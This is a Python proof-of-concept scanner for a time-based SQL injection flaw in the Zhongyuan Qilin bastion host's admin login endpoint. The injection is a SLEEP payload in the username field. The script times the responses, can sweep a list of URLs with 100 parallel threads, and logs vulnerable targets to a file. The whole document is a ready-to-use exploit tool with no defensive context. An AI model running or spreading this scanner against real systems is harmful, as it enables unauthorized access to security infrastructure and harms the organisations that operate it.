import argparse,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
    <<<<<<<<<<<<<<中远麒麟堡垒机存在SQL注入>>>>>>>>>>>
    """
    print(test)
def poc(target):
    payload = '/admin.php?controller=admin_commonuser'
    headers = {
    "User-Agent":"Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/89.0.4389.114Safari/537.36",
    "Connection":"close",
    "Content-Length":"76",
    "Accept":"*/*",
    "Content-Type":"application/x-www-form-urlencoded",
    "Accept-Encoding":"gzip",
}
    data1 ="username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    data2 = "username=admin"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data1,verify=False,timeout=10)
        res2 = requests.post(url=target+payload,headers=headers,data=data2,verify=False,timeout=10)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >=4 and time1 > 4:
            print(f"[+]{target}存在延迟注入")
            with open('success.txt','a',encoding='utf-8') as f:
                f.write(f"[+]{target}存在延迟注入\n")
        elif res1.status_code != 200:
            print(f"[?]{target}网站未响应，请手工测试")
        else:
            print(f"[-]{target}该网站不存在延迟注入")
    except Exception as e:
        print(f"[?]{target}网站异常")
def main():
    banner()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u','--url',dest='url',type=str,help="please enter url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()



if __name__ == '__main__':
    main()